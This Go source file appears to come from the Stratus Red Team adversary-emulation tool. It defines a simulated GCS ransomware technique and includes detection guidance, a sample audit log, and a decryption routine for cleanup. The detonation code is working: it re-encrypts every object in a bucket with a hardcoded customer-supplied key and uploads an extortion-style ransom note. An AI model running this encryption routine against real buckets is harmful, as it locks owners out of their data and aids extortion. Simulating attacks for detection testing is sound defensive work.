package gcp

import (
	"bytes"
	"context"
	_ "embed"
	"fmt"
	"io"
	"log"
	"strings"

	"cloud.google.com/go/storage"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus/mitreattack"
	"google.golang.org/api/iterator"
)

//go:embed main.tf
var tf []byte

const RansomNoteFilename = `FILES-DELETED.txt`
const RansomNoteContents = `Your data is backed up in a safe location. To negotiate with us for recovery, get in touch with rick@astley.io. In 7 days, if we don't hear from you, that data will either be sold or published, and might no longer be recoverable.`

// 32-byte AES-256 key used as a customer-supplied encryption key (CSEK).
// The key is hardcoded so that the technique can be reverted (decrypted) for cleanup.
var EncryptionKey = []byte("427fc7323cfb4b58f630789d372476fb")

const CodeBlock = "```"

func init() {
	stratus.GetRegistry().RegisterAttackTechnique(&stratus.AttackTechnique{
		ID:           "gcp.impact.gcs-ransomware-client-side-encryption",
		FriendlyName: "GCS Ransomware through client-side encryption",
		Description: `
Simulates GCS ransomware activity that encrypts files in a Cloud Storage bucket with a static key, through GCS [Customer-Supplied Encryption Keys](https://cloud.google.com/storage/docs/encryption/customer-supplied-keys) (CSEK).

Warm-up:

- Create a Cloud Storage bucket
- Create a number of objects in the bucket, with random content and extensions

Detonation:

- List all objects in the bucket
- Rewrite every object in place with a customer-supplied AES-256 encryption key, using [objects.rewrite](https://cloud.google.com/storage/docs/json_api/v1/objects/rewrite). Once encrypted, the object can no longer be read without supplying the same key.
- Upload a ransom note to the bucket

References:

- [Detecting and Hunting for Cloud Ransomware Part 2: GCP GCS (Panther)](https://panther.com/blog/detecting-and-hunting-for-cloud-ransomware-part-2-gcp-gcs)
- [Mitigate ransomware attacks using Google Cloud (Google Cloud Architecture Center)](https://cloud.google.com/architecture/security/mitigating-ransomware-attacks)
- [Customer-supplied encryption keys (GCS documentation)](https://cloud.google.com/storage/docs/encryption/customer-supplied-keys)
`,
		Detection: `
You can detect ransomware activity by identifying abnormal patterns of objects being rewritten in place.
The GCS rewrite API (used to encrypt an object with a customer-supplied key without changing its name) is recorded in [Data Access audit logs](https://cloud.google.com/storage/docs/audit-logging) with <code>methodName: storage.objects.create</code>

A rewrite-in-place can be distinguished from a regular upload by inspecting <code>authorizationInfo</code>: a rewrite checks <strong>both</strong> <code>storage.objects.delete</code> and <code>storage.objects.create</code> permissions on the same object, whereas a plain upload only checks <code>storage.objects.create</code>.

Note that GCS Data Access logs are not enabled by default and must be [explicitly enabled](https://cloud.google.com/storage/docs/audit-logging#enabling) at the project or organization level.

Sample audit log event for a rewrite-in-place, shortened for readability:

` + CodeBlock + `json hl_lines="4 7 9 13"
{
  "protoPayload": {
    "serviceName": "storage.googleapis.com",
    "methodName": "storage.objects.create",
    "resourceName": "projects/_/buckets/target-bucket/objects/target-object-key",
    "authorizationInfo": [
      { "permission": "storage.objects.delete", "granted": true },
      { "permission": "storage.objects.create", "granted": true }
    ],
    "authenticationInfo": {
      "principalEmail": "attacker@example.com"
    }
  },
  "resource": {
    "type": "gcs_bucket",
    "labels": {
      "bucket_name": "target-bucket"
    }
  }
}
` + CodeBlock + `
`,
		Platform:                   stratus.GCP,
		IsIdempotent:               false,
		MitreAttackTactics:         []mitreattack.Tactic{mitreattack.Impact},
		PrerequisitesTerraformCode: tf,
		Detonate:                   detonate,
		Revert:                     revert, // We need to decrypt files before cleaning up, otherwise Terraform can't delete them properly
	})
}

func detonate(params map[string]string, providers stratus.CloudProviders) error {
	bucketName := params["bucket_name"]
	ctx := context.Background()

	client, err := storage.NewClient(ctx, providers.GCP().Options())
	if err != nil {
		return fmt.Errorf("failed to create GCS client: %w", err)
	}
	defer client.Close()

	log.Println("Simulating a ransomware attack on bucket " + bucketName)

	if err := encryptAllObjects(ctx, client, bucketName); err != nil {
		return fmt.Errorf("failed to encrypt objects in the bucket: %w", err)
	}

	log.Println("Uploading fake ransom note")
	if err := uploadObject(ctx, client, bucketName, RansomNoteFilename, strings.NewReader(RansomNoteContents)); err != nil {
		return fmt.Errorf("failed to upload ransom note to the bucket: %w", err)
	}

	return nil
}

func encryptAllObjects(ctx context.Context, client *storage.Client, bucketName string) error {
	bucket := client.Bucket(bucketName)
	it := bucket.Objects(ctx, nil)
	var names []string
	for {
		attrs, err := it.Next()
		if err == iterator.Done {
			break
		}
		if err != nil {
			return fmt.Errorf("unable to list bucket objects: %w", err)
		}
		names = append(names, attrs.Name)
	}
	log.Printf("Found %d objects to encrypt", len(names))
	log.Printf("Encrypting all objects one by one with the secret AES256 customer-supplied encryption key '%s'", EncryptionKey)

	for _, name := range names {
		src := bucket.Object(name)
		dst := bucket.Object(name).Key(EncryptionKey)
		if _, err := dst.CopierFrom(src).Run(ctx); err != nil {
			return fmt.Errorf("unable to encrypt object %s: %w", name, err)
		}
	}
	log.Println("Successfully encrypted all objects in the bucket")
	return nil
}

func uploadObject(ctx context.Context, client *storage.Client, bucketName, objectName string, content io.Reader) error {
	writer := client.Bucket(bucketName).Object(objectName).NewWriter(ctx)
	if _, err := io.Copy(writer, content); err != nil {
		writer.Close()
		return fmt.Errorf("unable to write object %s: %w", objectName, err)
	}
	return writer.Close()
}

func revert(params map[string]string, providers stratus.CloudProviders) error {
	bucketName := params["bucket_name"]
	ctx := context.Background()

	client, err := storage.NewClient(ctx, providers.GCP().Options())
	if err != nil {
		return fmt.Errorf("failed to create GCS client: %w", err)
	}
	defer client.Close()

	log.Println("Decrypting all files in the bucket")
	if err := decryptAllObjects(ctx, client, bucketName); err != nil {
		return fmt.Errorf("failed to decrypt objects in the bucket: %w", err)
	}

	return nil
}

func decryptAllObjects(ctx context.Context, client *storage.Client, bucketName string) error {
	bucket := client.Bucket(bucketName)
	it := bucket.Objects(ctx, nil)
	var names []string
	for {
		attrs, err := it.Next()
		if err == iterator.Done {
			break
		}
		if err != nil {
			return fmt.Errorf("unable to list bucket objects: %w", err)
		}
		names = append(names, attrs.Name)
	}
	log.Printf("Found %d objects to decrypt", len(names))
	log.Printf("Decrypting all objects one by one with the secret AES256 customer-supplied encryption key '%s'", EncryptionKey)

	for _, name := range names {
		if name == RansomNoteFilename {
			if err := bucket.Object(name).Delete(ctx); err != nil {
				return fmt.Errorf("unable to delete ransom note %s: %w", name, err)
			}
			continue
		}
		src := bucket.Object(name).Key(EncryptionKey)
		reader, err := src.NewReader(ctx)
		if err != nil {
			return fmt.Errorf("unable to read encrypted object %s: %w", name, err)
		}
		content, err := io.ReadAll(reader)
		reader.Close()
		if err != nil {
			return fmt.Errorf("unable to download encrypted object %s: %w", name, err)
		}

		if err := bucket.Object(name).Delete(ctx); err != nil {
			return fmt.Errorf("unable to delete encrypted object %s: %w", name, err)
		}

		if err := uploadObject(ctx, client, bucketName, name, bytes.NewReader(content)); err != nil {
			return fmt.Errorf("unable to re-upload decrypted object %s: %w", name, err)
		}
	}
	log.Println("Successfully decrypted all objects in the bucket")
	return nil
}
